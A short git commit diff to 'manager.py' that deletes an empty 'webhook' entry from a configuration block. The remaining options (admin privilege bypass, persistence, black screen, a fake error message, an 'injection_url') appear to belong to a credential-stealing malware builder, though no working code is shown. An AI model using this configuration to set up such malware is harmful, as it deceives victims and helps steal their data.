2cee16ceab69978243497331afebb42b18c76f6a
Toolsbools123 <134845200+Toolsbools123@users.noreply.github.com>
2023-08-03 08:58:12 +0200

    Update manager.py

--- manager.py
+++ manager.py
@@ -15,7 +15,6 @@ config = {
     # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
     # Black Screen: Make screen black? (True/False, Bool)
     # Error Message: Fake error text to display. (Leave Blank for None)
-    'webhook': '',
     'persist': True,
     'keep-alive': False,
     'injection_url': 'url to injection (raw)',
